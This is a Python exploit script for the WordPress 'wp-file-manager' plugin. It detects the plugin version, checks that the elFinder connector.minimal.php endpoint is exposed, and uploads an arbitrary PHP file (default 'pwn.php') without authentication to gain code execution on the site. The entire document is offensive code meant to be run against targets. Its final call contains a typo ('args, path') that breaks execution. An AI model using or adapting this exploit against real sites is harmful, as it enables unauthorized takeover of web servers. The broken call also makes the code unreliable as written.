#!/usr/bin/env python3
# coding: utf-8
import requests
import urllib3
import argparse
from urllib.parse import urljoin
from os.path import join as pathjoin
import json, re

urllib3.disable_warnings()
# requests: http://docs.python-requests.org/en/master/

proxy = {
        'http'  : 'http://127.0.0.1:8080',
        'https' : 'http://127.0.0.1:8080'
        }
user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36'

# https://requests.readthedocs.io/en/master/user/advanced/
s = requests.Session()
s.proxies = proxy
s.verify = False
s.cookies.clear()
s.headers.update({'User-Agent': user_agent})
CONNECTOR = 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
CONNECTOR_VERSION = 'wp-content/plugins/wp-file-manager/readme.txt'

def send_file(url, root='/',filename='pwn.php'):
    files = {'upload[]': (filename, open(filename, 'rb'), 'application/x-php'),
    'action':(None, 'mk_file_folder_manager'),
    'target':(None, 'l1_Lw'),
    'cmd':(None, 'upload'),
    'reqid': (None, '1')}
    p = pathjoin(root, CONNECTOR)
    r = s.post(urljoin(url, p), files=files)
    if r.status_code == 200:
        j = r.json()
        if len(j['added']) > 0:
            print("[+] Exploited")
            print(urljoin(url,r.json()['added'][0]['url']))
        else:
            print('[-] Something fail\n%s' % j)
    else:
        print("[-] Potentially non exploitable")

def version(url, root='/'):
    p = pathjoin(root, CONNECTOR_VERSION)
    r = s.get(urljoin(url, p))
    m=re.findall(r"Stable tag: (\d*\.\d*)",r.content.decode('utf-8'), re.MULTILINE)
    if m:
        print("[+] Detected version: %s" % m)


def check(url, root='/'):
    p = pathjoin(root, CONNECTOR)
    r = s.get(urljoin(url, p))
    if r.status_code == 200:
        if "json" in r.headers['Content-Type']:
            if r.json()['error']:
                return True
        else:
            print("[-] Not returning JSON")
            print(r.content)
    return False

parser = argparse.ArgumentParser(epilog='Example: wp-file-manager-6.8.py -f info.php http://x.x.x.x/')
parser.add_argument('--file', '-f',
    dest = 'file',
    help = 'file to upload')
parser.add_argument(type=str,
    dest = 'target',
    help = 'Target URL')
parser.add_argument('--path', '-p',
    dest = 'path',
    default = '/',
    help = 'Remote path')
args = parser.parse_args()

version(args.target, args.path)
if check(args.target, args.path):
    print("[+] Connector.minimal is exposed")
    print("[+] Trying to exploit")
    send_file(args.target, args, path, args.file)
else:
    print("[-] Connector.minimal doesn't seem to be exposed")
